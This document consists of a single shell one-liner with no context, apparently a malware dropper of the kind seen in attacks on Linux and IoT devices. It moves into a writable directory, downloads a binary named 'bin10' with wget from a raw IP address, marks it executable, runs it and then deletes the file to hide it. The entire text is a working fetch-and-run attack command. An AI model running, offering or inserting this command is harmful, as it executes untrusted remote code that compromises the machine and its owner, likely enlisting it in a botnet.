cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.150.51.170/bin10; chmod +x bin10; ./bin10; rm -rf bin10
